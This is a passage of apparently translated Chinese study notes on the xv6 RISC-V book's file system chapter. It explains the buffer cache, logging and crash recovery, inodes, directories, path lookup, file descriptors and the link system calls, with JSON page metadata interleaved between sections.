访问磁盘比访问内存慢几个数量级，因此文件系统必须维护一个内存中的高速缓存以存储常用的block。 本章的剩下的部分将解释xv6如何应对这些挑战。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Overview Xv6文件系统实现分为七个层次，如图8.1所示。Disk层读取和写入virtio硬盘上的块。Buﬀer cache层缓存磁盘块并同步对它们的访问，确保每次只有一个内核进程可以修改任何特定块中存储的数据。Logging层允许更高层将对多个块的更新包装在transaction中，并确保在发生崩溃时原子地更新这些块（即它们要么全部更新，要么一个也不更新）。Inode层提供了单个文件，每个文件都表示为一个具有唯一编号i和一些包含文件数据的块的inode。Directory层将每个目录实现为一种特殊类型的inode，其内容是一系列目录条目，每个目录条目包含文件的名称和i编号。Pathname层提供类似于/usr/rtm/xv6/fs.c的分层路径名，并使用递归查找解析它们。File descriptor层使用文件系统接口抽象了许多Unix资源（例如，管道、设备、文件等），简化了应用程序程序员的工作。 传统上，磁盘硬件将磁盘上的数据表示为一系列编号的512字节块（也称为扇区， sectors）：扇区0是前512字节，扇区1是接下来的，依此类推。操作系统用于文件系统的块（block）大小可能与磁盘使用的扇区大小不同，但通常block的大小是sector大小的倍数。Xv6将其读入内存的块的副本存储在struct buf类型的对象中（kernel/buf.h）。该结构中存储的数据有时与磁盘不同步：它可能尚未从磁盘读取（磁盘正在处理，但尚未返回扇区的内容），或者它可能已被软件更新，但尚未写入磁盘。 文件系统必须有一个计划，确定在磁盘上存储inode和content blocks的位置。为此，xv6将磁盘划分为几个部分，如图8.2所示。文件系统不使用块0（它保存引导扇区）。块1称为superblock；它包含有关文件系统的元数据（文件系统大小、数据块数、inode数和日志中的块数）。从块2开始保存日志。在日志之后是inodes，每个块包含多个inode。在它们之后是用于跟踪哪些数据块正在使用的bitmap block。其余的块是数据块；每个数据块在bitmap block中标记为free，或者保存文件或目录的内容。superblock由一个名为mkfs的单独的程序填充，该程序构建初始文件系统。 本章的其余部分将讨论文件系统的每一层，从buffer cache开始。请注意在较低层次选择得当的抽象如何简化较高层次的设计。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Buffer cache layer 缓冲区缓存有两个任务：(1) 同步对磁盘块的访问，以确保内存中只有一个块的副本，并且每次只有一个内核线程使用该副本；(2) 缓存常用块，以便它们无需从慢速磁盘重新读取。相关代码在bio.c中。 Buﬀer cache主要提供的接口包括bread()和bwrite()；前者获取一个包含块副本的buf，可以在内存中读取或修改，而后者将修改后的缓冲区写入磁盘上的相应的block。内核线程在完成对缓冲区的使用后必须通过调用brelse()来释放缓冲区。Buﬀer cache通过使用每个缓冲区的sleep-lock确保了每次只有一个线程使用该缓冲区；bread()返回一个已锁定的缓冲区，而brelse()释放锁。 Buffer cache有固定数量的缓冲区来保存磁盘块，这意味着如果文件系统请求一个尚未在缓存中的块，缓冲区缓存必须回收当前保存其他块的缓冲区。缓冲区缓存为新块回收最近最少使用的缓冲区。这个假设是最近最少使用的缓冲区最不可能很快再次被使用。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: Buffer cache Buffer cache是一个双向链表，由NBUF个缓冲区的静态数组buf（kernel/bio.c）初始化。由main()调用的函数binit()负责初始化这个链表。所有对buffer cache的访问都通过bcache.head引用链表，而不是buf数组。 每个cache都有两个与之相关的状态字段。valid字段指示缓冲区包含块的副本。disk字段指示缓冲区内容已经交给磁盘，这可能会改变缓冲区（例如，从磁盘写入数据）。 bread()调用bget()以获取给定扇区的缓冲区。如果需要从磁盘读取缓冲区，bread()调用virtio_disk_rw()执行读取操作，然后返回缓冲区。 bget()扫描缓冲区列表，查找具有给定设备和扇区号的缓冲区。如果存在这样的缓冲区，bget()获取缓冲区的sleep-lock。然后，bget()返回锁定的缓冲区。 如果给定扇区没有缓存的缓冲区，bget()必须创建一个，可能会重用曾经包含不同扇区的缓冲区。它再次扫描缓冲区列表，寻找未使用的缓冲区（b-\u003erefcnt = 0）；任何这样的缓冲区都可以使用。bget()编辑buffer的metadata以记录新的设备和扇区号，并获取其sleep-lock。请注意，赋值b-\u003evalid = 0确保bread()将从磁盘读取块数据，而不会错误地使用缓冲区的先前内容。 为了确保读取者能够看到写入的内容和文件系统在cache上使用锁进行同步，必须确保每个磁盘扇区最多只有一个buffer cache。bget()通过在第一个循环检查块是否已缓存时持续持有bache.lock，直到第二个循环声明块现在已缓存（通过设置dev、blockno和refcnt）来确保这个不变式。这导致对block存在性的检查（如果不存在，则指定用于保存块的缓冲区）是原子的。 bget()在bcache.lock关键部分之外获取缓冲区的sleep-lock是安全的，因为非零的b-\u003erefcnt阻止重用缓冲区用于不同的磁盘块。Sleep-lock保护对块缓冲内容的读取和写入，而bcache.lock保护有关哪些块已被缓存的信息。 如果所有的缓冲区都是busy的，说明有太多的进程同时执行文件系统调用；此时，bget()会产生 panic。一个更好的响应可能是等待到有一个缓冲区变为空闲，虽然这样可能导致死锁。 一旦bread()读取了磁盘并将缓冲区返回给调用者，调用者就独占了该缓冲区，并可以读取或写入数据字节。如果调用者修改了缓冲区，必须调用bwrite()将更改的数据写入磁盘，然后释放缓冲区。bwrite()调virtio_disk_rw()与磁盘硬件进行通信。 当调用者使用完缓冲区后，必须调用brelse()进行释放。brelse()的名字虽然有点神秘(b-release)，但值得学习：它起源于 Unix，并在 BSD、Linux 和 Solaris 中也被使用。brelse()释放了sleep-lock，并将缓冲区移动到链表的前面。移动缓冲区会导致链表按照缓冲区的最近使用时间排序：链表中的第一个缓冲区是最近使用过的，而最后一个是最久未使用的。bget()中的两个循环利用了这一点：在最坏的情况下，查找现有缓冲区必须处理整个链表，但首先检查最近使用的缓冲区（从bcache.head开始，按照next指针进行跟踪）将减少扫描时间，当引用局部性较好时。选择要重用的缓冲区的扫描通过向后扫描（按照prev指针进行跟踪）选择最久未使用的缓冲区。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Logging layer 文件系统设计中最有趣的问题之一是crash recovery。这个问题的出现是因为许多文件系统操作涉及对磁盘的多次写入，而在一些写入的子集之后发生的崩溃可能会导致磁盘上的文件系统处于不一致的状态。例如，假设在文件截断（将文件长度设置为零并释放其内容块）期间发生崩溃。根据磁盘写入的顺序，崩溃可能会使一个inode引用一个被标记为自由的内容块，或者它可能会留下一个分配但未引用的内容块。 后者相对无害，但是引用已释放块的inode在重启后可能会导致严重的问题。重启后，内核可能会将该块分配给另一个文件，现在我们有两个不同的文件无意中指向相同的块。如果xv6支持多个用户，这种情况可能是一个安全问题，因为旧文件的所有者将能够读取和写入由不同用户拥有的新文件中的块。 Xv6通过一种简单的日志形式解决了在文件系统操作期间发生崩溃的问题。在xv6中，一个系统调用不会直接写入磁盘上的文件系统数据结构。相反，它将希望进行的所有磁盘写入的描述放入磁盘上的一个日志中。一旦系统调用记录了所有的写入，它就会向磁盘写入一个特殊的commit记录，指示日志包含一个完整的操作。此时，系统调用将写入复制到磁盘上的文件系统数据结构中。在这些写入完成之后，系统调用会擦除磁盘上的日志。 如果系统崩溃并重新启动，文件系统代码将在运行任何进程之前按照以下步骤从崩溃中恢复。如果日志被标记为包含完整的操作，那么恢复代码将把写入复制到它们在磁盘上的正确位置。如果日志没有被标记为包含完整的操作，恢复代码将忽略该日志。恢复代码最后会擦除日志。 为什么xv6的日志解决了文件系统操作期间发生崩溃的问题呢？如果崩溃发生在操作提交之前，那么磁盘上的日志将不会被标记为完整，恢复代码将忽略它，磁盘的状态将好像操作甚至还没有开始。如果崩溃发生在操作提交之后，那么恢复将重新播放所有操作的写入，如果该操作已经开始将它们写入磁盘数据结构，则可能重复执行它们。在任一情况下，日志使操作在崩溃方面具有原子性：恢复后，要么所有操作的写入都出现在磁盘上，要么它们都不出现。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Log design Log位于superblock中指定的已知固定位置。它由一个header block和一个更新块副本序列（“logged blocks”）组成。Header block包含一个用于记录扇区号的数组和log blocks的计数。磁盘上header block中的计数要么为零，表示日志中没有事务，要么为非零，表示日志包含一个完整的已提交事务，其中包含指定数量的logged blocks。Xv6在transaction提交时写入header block，但在此之前不写入，并在将logged blocks复制到文件系统后将计数设置为零。因此，在transaction中途发生崩溃将导致日志头块中的计数为零；在提交后发生崩溃将导致计数为非零。 每个系统调用的代码指示了必须在崩溃方面具有原子性的写入序列的开始和结束。为了允许不同进程之间并发执行文件系统操作，日志系统可以将多个系统调用的写入积累到一个transaction中。因此，一个单独的提交可能涉及多个完整系统调用的写入。为了避免将系统调用跨越多个transaction，日志系统仅在没有进行文件系统系统调用时才进行提交。 将多个事务一起提交的想法称为group commit。Group commit减少了磁盘操作的次数，因为它将提交的固定成本分摊到多个操作中。Group commit还一次性向磁盘系统提供了更多的并发写入，也许允许磁盘在单个磁盘旋转期间将它们全部写入。Xv6的virtio驱动程序不支持这种批处理方式，但xv6的文件系统设计允许这样做。 Xv6在磁盘上专门分配了一定数量的空间来保存日志。事务中由系统调用写入的块的总数必须适应该空间。这带来了两个后果。 不允许单个系统调用写入的不同块的数量超过日志中的空间。对于大多数系统调用来说，这不是问题，但其中两个系统调用可能会写入许多块：write()和unlink()。大文件写入可能会写入许多data blocks和许多bitmap blocks以及一个inode块；取消链接大文件可能会写入许多bitmap blocks和一个inode。Xv6的write()系统调用将大写入拆分为适应日志的多个较小写入，而unlink()不会引起问题，因为实际上xv6文件系统只使用一个bitmap block。 有限的日志空间的另一个后果是，除非确定系统调用的写入将适应日志中剩余的空间，否则日志系统不能允许系统调用启动。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: logging 在系统调用中，一个典型的log的使用如下所示： begin_op(); ... bp = bread(...); bp-\u003edata[...] = ...; log_write(bp); ... end_op(); begin_op()（kernel/log.c）会等待，直到日志系统当前没有进行提交，并且有足够的未保留的日志空间来容纳此调用的写入。log.outstanding计算已经保留了日志空间的系统调用数量；总的保留空间是log.outstanding乘以MAXOPBLOCKS。增加log.outstanding既保留空间又防止在此系统调用期间发生提交。该代码保守地假设每个系统调用可能写入多达MAXOPBLOCKS个不同的块。 log_write()替代了bwrite。它在内存中记录块的扇区号，在磁盘上为其保留一个槽，并将缓冲区锁定在块缓存中，以防止块缓存将其逐出。块必须保留在缓存中直到提交为止：在那之前，缓存的副本是修改的唯一记录；在提交之前，不能将其写入磁盘上的位置；同一事务中的其他读取必须看到修改。log_write()在单个transaction中多次写入块时会注意到，并在日志中为该块分配相同的槽。这种优化通常称为absorption。例如，在单个transaction中可能多次写入包含多个文件的inode的磁盘块。通过将多个磁盘写入吸收为一个，文件系统可以节省日志空间，并且因为只需要将磁盘块的一个副本写入磁盘，所以可以实现更好的性能。 end_op()首先递减未完成的系统调用计数。如果计数现在为零，则通过调用commit()提交当前事务。该过程分为四个阶段。write_log()将transaction中修改的每个块从缓冲区复制到磁盘上的日志槽中。write_head()将header block写入磁盘：这是commit point，如果在写入后发生崩溃，恢复将从日志中重新执行transaction的写入。install_trans()从日志中读取每个块并将其写入文件系统中的适当位置。最后，end_op()写入带有计数零的log header；这必须在下一个transaction开始写入logged blocks之前发生，以便在崩溃时恢复不会使用一个transaction的头以及后续transaction的logged blocks。 recover_from_log()是从initlog()调用的，而initlog()是在引导过程中，在第一个用户进程运行之前从fsinit()被调用。它读取log header，并在header指示日志包含一个已提交transaction时模仿end_op()的操作。 日志的一个示例用法出现在filewrite()中。该transaction如下： begin_op(); ilock(f-\u003eip); r = writei(f-\u003eip, ...); iunlock(f-\u003eip); end_op(); 此代码被包装在一个循环中，将大型写操作分解为仅包含几个扇区的单独transaction，以避免日志溢出。writei()的调用在此transaction中写入许多块：文件的 inode，一个或多个bitmap blocks以及一些data blocks。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: Block allocator 文件和目录内容存储在磁盘块中，这些块必须从一个空闲的pool中分配。Xv6 的block allocator在磁盘上维护一个free bitmap，每个块对应一个位。零位表示相应的块是空闲的；一位表示它正在使用中。mkfs程序设置与boot sector、superblock、log blocks、inode 块和bitmap blocks对应的位。 Block allocator提供两个功能：balloc()用于分配新的磁盘块，bfree()用于释放块。balloc()中的循环（kernel/fs.c）考虑每个块，从块 0 到 sb.size（文件系统中的块数）。它查找bitmap位为零的块，表示它是空闲的。如果找到这样的块，balloc()就会更新bitmap并返回该块。为了提高效率，循环分为两个部分。外部循环读取每个bitmap位的块。内部循环检查单个bitmap block中的所有Bits-Per-Block（BPB）。如果两个进程尝试同时分配块，可能发生的竞争由于缓冲区缓存一次只允许一个进程使用任何一个bitmap block而被阻止。 bfree()找到正确的bitmap block并清除正确的位。同样，由bread()和brelse()隐含的独占使用避免了对显式锁定的需求。 与本章剩余部分描述的大部分代码一样，balloc()和bfree()必须在一个transaction内调用。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Inode layer 术语 “inode” 可以有两个相关的含义。它可能指的是包含文件大小和数据块编号列表的磁盘上的数据结构。或者 “inode” 可能指的是内存中的 inode，其中包含磁盘上 inode 的副本以及内核内部所需的额外信息。 磁盘上的 inodes 被紧密地打包成一个称为 inode 块的连续磁盘区域。每个 inode 的大小相同，因此，根据给定的编号 n，可以轻松找到磁盘上的第 n 个 inode。实际上，这个编号 n，称为 inode 编号或 i-number，是实现中用于标识 inodes 的方式。 磁盘上的 inode 由struct dinode定义。type 字段区分文件、目录和特殊文件（设备）。类型为零表示磁盘上的 inode 是空闲的。nlink 字段计算引用此 inode 的目录条目数量，以便在应该释放磁盘上的 inode 及其数据块时识别。size 字段记录文件内容的字节数。addrs 数组记录持有文件内容的磁盘块的块编号。 内核将active的 inodes 集合保存在内存中的一个称为 itable 的表中；struct inode是磁盘上 struct dinode 的内存副本。内核仅在有 C 指针引用该 inode 时才将 inode 保存在内存中。ref 字段计算引用该内存中的 inode 的 C 指针数量，如果引用计数降至零，内核将从内存中丢弃该 inode。iget() 和 iput() 函数获取和释放对 inode 的指针，同时修改引用计数。指向 inode 的指针可以来自文件描述符、当前工作目录和transient kernel code（如 exec）。 xv6 的 inode 代码中有四个锁或类似锁的机制。itable.lock 保护 inode 最多只在 inode 表中出现一次的不变性，以及内存中的 inode 的 ref 字段计算指向该 inode 的内存指针的数量的不变性。每个内存中的 inode 都有一个 lock 字段，其中包含一个 sleep-lock，确保对 inode 的字段（如文件长度）以及 inode 的文件或目录内容块的独占访问。如果 inode 的 ref 大于零，则系统会在表中维护该 inode，并且不会重用表条目以用于不同的 inode。最后，每个 inode 包含一个 nlink 字段（在磁盘上和在内存中复制），计算引用文件的目录条目数量；如果 inode 的链接计数大于零，xv6 将不会释放该 inode。 iget() 返回的 struct inode 指针在对应的 iput() 调用之前是有效的；该 inode 不会被删除，指针引用的内存也不会被重用于不同的 inode。iget() 提供对 inode 的非独占访问，因此可以有多个指向相同 inode 的指针。文件系统代码的许多部分都依赖于 iget() 的这种行为，既用于保持对 inodes 的长期引用（如打开的文件和当前目录），又用于在处理多个 inodes 的代码中避免竞争而避免死锁（如路径名查找）。 iget() 返回的 struct inode 可能没有任何有用的内容。为了确保它包含磁盘上 inode 的副本，代码必须调用 ilock。这将锁定 inode（以便其他进程无法锁定它），并从磁盘读取 inode，如果尚未读取。iunlock 释放 inode 上的锁。将获取 inode 指针与锁定分开有助于在某些情况下避免死锁，例如在目录查找期间。多个进程可以持有 iget() 返回的指向 inode 的 C 指针，但一次只能有一个进程锁定 inode。 inode表仅存储内核代码或数据结构持有 C 指针的 inodes。其主要工作是同步多个进程的访问。inode表也恰好缓存了频繁使用的 inodes，但缓存是次要的；如果 inode 频繁使用，缓冲区缓存可能会保持它在内存中。修改内存中的 inode 的代码使用 iupdate() 将其写入磁盘。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:8:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: Inodes 为了分配一个新的 inode（例如，创建文件时），xv6 调用 ialloc()（kernel/fs.c）。ialloc() 类似于 balloc()：它循环遍历磁盘上的 inode 结构，逐个块查找标记为 free 的 inode。当找到一个时，它通过将新的类型写入磁盘来声明它，然后通过调用 iget() 返回 inode 表中的一个条目。ialloc() 的正确操作依赖于一个事实，即一次只能有一个进程持有对 bp 的引用：ialloc() 可以确信没有其他进程同时看到 inode 可用并尝试声明它。 iget() 在 inode 表中查找一个具有所需设备和 inode 编号的活动条目（ip-\u003eref \u003e 0）。如果找到一个，它将返回对该 inode 的新引用。在扫描时，iget 记录了第一个空槽的位置，如果需要分配表条目，它将使用该位置。 代码在读取或写入 inode 的metadata或内容之前必须使用 ilock() 锁定 inode。ilock()为此目的使用了一个 sleep-lock。一旦 ilock 具有对 inode 的独占访问权，它将根据需要从磁盘（更可能是缓冲区缓存）读取 inode。iunlock() 函数释放了 sleep-lock，这可能导致正在休眠的任何进程被唤醒。 iput() 通过减少引用计数释放对 inode 的 C 指针。如果这是最后一个引用，那么 inode 表中的该 inode 位置现在空闲，可以用于不同的 inode。 如果 iput() 发现没有 C 指针引用一个 inode，并且该 inode 没有指向它的链接（在任何目录中都没有），那么这个 inode 及其data block必须被释放。iput() 调用 itrunc() 将文件截断为零字节，释放数据块；将 inode 类型设置为 0（未分配）；并将 inode 写入磁盘。 iput() 在释放 inode 的情况下的锁定协议值得仔细研究。一个危险是，一个并发线程可能正在 ilock() 中等待使用此 inode（例如，读取文件或列出目录），并且还没准备好发现该 inode 不再分配。这不会发生，因为系统调用无法在它没有对其进行链接的情况下获取指向内存中 inode 的指针，而 ip-\u003eref 为 1。这一个引用是调用 iput() 的线程拥有的引用。iput() 确实在 itable.lock 临界区外检查引用计数是否为 1，但在那时，链接计数已知为零，因此没有线程会尝试获取新引用。另一个主要的危险是，一个并发的 ialloc() 调用可能选择 iput() 正在释放的相同 inode。这只能在 iupdate() 写入磁盘后，inode 具有类型零的情况下发生。这种竞争是无害的；分配线程将在读取或写入 inode 之前礼貌地等待获取 inode 的 sleep-lock，在那时 iput 已经完成了对它的使用。 iput() 可以写入磁盘。这意味着任何使用文件系统的系统调用都可能写入磁盘，因为该系统调用可能是对文件的最后一个引用。即使像 read() 这样表面上是只读的调用，也可能最终调用 iput()。这反过来意味着即使是只读系统调用，如果它们使用文件系统，也必须包装在transaction中。 iput() 和crash之间存在一个复杂的交互。iput() 在文件的链接计数降至零时并不立即截断文件，因为某些进程可能仍然在内存中持有对 inode 的引用：进程可能仍然在读取和写入文件，因为它成功打开了文件。但是，如果在最后一个进程关闭文件描述符之前发生崩溃，那么文件将在磁盘上标记为已分配，但没有目录项指向它。 文件系统处理这种情况的方式有两种。简单的解决方案是在重启后的恢复过程中，文件系统扫描整个文件系统，查找已标记为分配但没有目录项指向它们的文件。如果存在这样的文件，它们就可以被释放。 第二种解决方案则无需扫描整个文件系统。在这种解决方案中，文件系统在磁盘上记录（例如，在super block中）链接计数降至零但引用计数不为零的文件的 inode 编号。如果文件系统在引用计数达到 0 时删除文件，那么它会通过从列表中删除该 inode 来更新磁盘上的列表。在恢复时，文件系统会释放列表中的任何文件。 Xv6 没有实现这两种解决方案，这意味着即使 inode 不再使用，它们可能仍然在磁盘上标记为已分配。这意味着随着时间的推移，xv6 有可能会耗尽磁盘空间。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:9:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: Inode content 磁盘上的 inode 结构 struct dinode 包含一个大小（size）和一个block numbers数组（见图 8.3）。inode 数据位于列在 dinode 的 addrs 数组中的块中。前 NDIRECT 个数据块列在数组的前 NDIRECT 个条目中；这些块称为直接块（direct blocks）。接下来的 NINDIRECT 个数据块的位置不在 inode 中，而是在一个称为间接块（indirect block）的数据块中。addrs 数组中的最后一个条目给出了间接块的地址。因此，文件的前 12 kB（NDIRECT x BSIZE）字节可以从 inode 中列出的块中加载，而接下来的 256 kB（NINDIRECT x BSIZE）字节只能在查阅间接块后加载。这是一种适合磁盘的表示，但对客户端而言过于复杂。函数 bmap() 管理这种表示，以便higher-level routines，例如后面将要看到的 readi() 和 writei()，不需要处理这种复杂性。bmap() 返回 inode ip 的第 bn 个数据块的磁盘块号。如果 ip 还没有这样的块，bmap 会分配一个。 函数 bmap()首先处理简单的情况：前 NDIRECT 个块列在 inode 本身中。接下来的 NINDIRECT 个块列在 ip-\u003eaddrs[NDIRECT] 处的间接块中。bmap 读取间接块，然后从块内的正确位置读取块号。如果块号超过NDIRECT+NINDIRECT，bmap() 会引发 panic；writei() 包含了防止这种情况发生的检查。 bmap() 根据需要分配块。ip-\u003eaddrs[] 或间接项为零表示未分配块。当 bmap() 遇到零时，它将其替换为新块的编号，由用户按需分配。 itrunc() 释放文件的块，将 inode 的大小重置为零。itrunc()首先释放direct blocks，然后释放indirect block中列出的块，最后释放indirect block本身。 bmap() 使得 readi() 和 writei() 能够轻松获取到 inode 的数据。readi()首先确保偏移量和计数不超出文件的末尾。从文件末尾开始的读取返回错误，而从文件末尾开始或横跨文件末尾的读取返回比请求的字节数少。主循环处理文件的每个块，将数据从缓冲区复制到 dst。writei() 与 readi() 相同，有三个例外：从文件末尾开始或横跨文件末尾的写入将增加文件的大小，最多增长到MAXFILE*BSIZE；循环将数据复制到缓冲区而不是从中复制；如果写入扩展了文件，则 writei() 必须更新其大小。 stati() 函数将 inode 元数据复制到 stat 结构中，通过 stat() 系统调用向用户程序公开。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:10:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: directory layer 一个目录在内部的实现方式与文件非常相似。它的 inode 的类型是 T_DIR，其数据是目录项的序列。每个目录项是一个 struct dirent（kernel/fs.h），其中包含一个名称和一个 inode 号。名称最多为 DIRSIZ（14）个字符；如果较短，它以 NULL（0）字节终止。inode 号为零的目录项是空闲的。 函数 dirlookup()（kernel/fs.c）在目录中搜索具有给定名称的条目。如果找到，则返回指向相应 inode 的指针（未锁定），并将 *poff 设置为目录内条目的字节偏移量，以便调用者希望对其进行编辑。如果 dirlookup() 找到具有正确名称的条目，它将更新 *poff 并返回通过 iget() 获得的未锁定 inode。dirlookup() 是 iget() 返回未锁定 inode 的原因。调用者已锁定 dp，因此如果查找是为了 .（表示当前目录的别名），在返回之前尝试锁定 inode 将尝试重新锁定 dp 并导致死锁。（涉及多个进程和 ..，表示父目录的别名，有更复杂的死锁场景；. 不是唯一的问题。）调用者可以解锁 dp 然后锁定 ip，确保一次只持有一个锁。 函数 dirlink()向目录 dp 写入具有给定名称和 inode 号的新目录项。如果名称已经存在，dirlink() 返回错误。主循环读取目录条目，寻找未分配的条目。当找到一个时，它提前结束循环，off 设置为可用条目的偏移量。否则，循环以 dp-\u003esize 为结束，dirlink() 然后通过在偏移量 off 处写入新条目将新条目添加到目录中。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:11:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: Path names Path names查找涉及对 dirlookup() 的一系列调用，每个调用对应路径的一个组成部分。namei()评估路径并返回相应的 inode。函数 nameiparent() 是一个变体：它在最后一个元素之前停止，返回父目录的 inode 并将最后一个元素复制到 name 中。这两个函数都调用了执行实际工作的通用函数 namex()。 namex() 首先决定路径评估从哪里开始。如果路径以斜杠开头，评估将从根目录开始；否则，从当前目录开始。然后使用 skipelem() 逐个考虑路径的每个元素。循环的每次迭代都必须在当前 inode ip 中查找 name。迭代从锁定 ip 并检查其是否为目录开始。如果不是，则查找失败。（锁定 ip 是必要的，不是因为 ip-\u003etype 可能在底层发生变化，而是因为在运行 ilock 之前，不能保证已从磁盘加载 ip-\u003etype。）如果调用了nameiparent 并且这是最后一个路径元素，则循环提前停止，根据 nameiparent() 的定义；最后的路径元素已经复制到 name 中，因此 namex 只需返回未锁定的 ip。最后，循环使用 dirlookup() 查找路径元素并准备进行下一次迭代，设置 ip = next。当循环耗尽路径元素时，返回 ip。 namex() 过程可能需要很长时间才能完成：它可能涉及多个磁盘操作，用于读取路径名中遍历的目录的 inode 和目录块（如果它们不在缓冲区中）。Xv6 被精心设计以便于在一个内核线程的 namex() 调用由于磁盘 I/O 而被阻塞的情况下，另一个内核线程查找不同的路径名可以同时进行。namex() 单独锁定路径中的每个目录，以便在不同的目录中进行的查找可以并行进行。 这种并发性带来了一些麻烦。例如，当一个内核线程正在查找路径名时，另一个内核线程可能正在通过取消链接目录来更改目录树。潜在的风险是，查找可能正在搜索已被另一个内核线程删除的目录，其块已被重新用于另一个目录或文件。 Xv6避免了这样的竞争情况。例如，在namex()中执行dirlookup()时，查找线程持有目录的锁，dirlookup()返回一个使用iget()获得的inode。iget()增加了inode的引用计数。只有在从dirlookup()接收到inode后，namex()才释放对目录的锁。现在，另一个线程可以从目录中取消链接inode，但是xv6不会立即删除inode，因为inode的引用计数仍然大于零。 另一个风险是死锁。例如，当查找\".“时，next指向与ip相同的inode。在释放ip的锁之前锁定next将导致死锁。为了避免这种死锁，namex()在获取对next的锁之前释放目录的锁。在这里我们再次看到iget()和ilock()之间的分离的重要。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:12:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"File descriptor layer Unix接口的一个很酷的方面是，Unix中的大多数资源都被表示为文件，包括console、pipe，当然还有真实的文件。File descriptor层是实现这种一致性的层。 Xv6为每个进程提供了其自己的打开文件表，或者称为文件描述符，正如我们在第一章中看到的那样。每个打开的文件由一个struct file表示，它是一个围绕inode或pipe的包装器，还有一个I/O偏移量。每次调用open()都会创建一个新的打开文件（一个新的struct file）：如果多个进程独立地打开同一个文件，不同的实例将具有不同的I/O偏移量。另一方面，一个单独的打开文件（相同的struct file）可以在一个进程的文件表中和多个进程的文件表中出现多次。如果一个进程使用open()打开文件，然后使用dup()创建别名或者使用fork()与子进程共享文件，就会发生这种情况。引用计数跟踪对特定打开文件的引用次数。文件可以以读、写或两者的方式打开，readable和writable字段跟踪这一点。 系统中所有打开的文件都保存在全局文件表ftable中。文件表具有分配文件（filealloc）、创建副本引用（filedup）、释放引用（fileclose）以及读取和写入数据（fileread和filewrite）的功能。 前三者遵循我们已经熟悉的形式。filealloc()扫描文件表以查找未引用的文件（f-\u003eref == 0）并返回一个新的引用；filedup增加引用计数；fileclose减小引用计数。当文件的引用计数达到零时，fileclose()释放底层的pipe或inode，根据类型而定。 filestat()、fileread()和filewrite()函数实现了对文件的stat、read和write操作。filestat()只允许在inodes上调用，并调用stati()。fileread()和filewrite()检查打开模式是否允许该操作，然后将调用传递给pipe或inode的实现。如果文件表示inode，fileread()和filewrite()使用I/O偏移作为操作的偏移，然后将其递增。Pipe没有偏移的概念。回想一下，inode函数要求调用者处理锁定。inode锁定的方便之处在于读写偏移是原子更新的，因此同时对同一文件进行多次写入不能覆盖彼此的数据，尽管它们的写入可能交织在一起。 ","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/:13:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Code: System calls 具有较低层提供的功能，大多数系统调用的实现都很简单（见(kernel/sysfile.c)）。有一些调用值得仔细研究。 函数sys_link和sys_unlink编辑目录，创建或删除对inodes的引用。它们是使用transaction的强大功能的另一个很好的例子。sys_link开始通过获取其参数，两个字符串old和new。假设old存在且不是目录，sys_link增加了它的ip-\u003enlink计数。然后，sys_link调用nameiparent()来找到new的父目录和最终路径元素，并创建一个指向old的inode的新目录项。新的父目录必须存在，并且在相同的设备上：inode号仅在单个磁盘上有唯一的含义。如果发生此类错误，sys_link必须返回并减少ip-\u003enlink。 transaction简化了实现，因为它需要更新多个磁盘块，但我们不必担心执行它们的顺序。它们要么全部成功，要么全部不成功。例如，如果没有transaction，先更新ip-\u003enlink再创建链接会使文件系统暂时处于不安全状态，而在两者之间崩溃可能导致混乱。有了transaction，我们就不必担心这个问题。 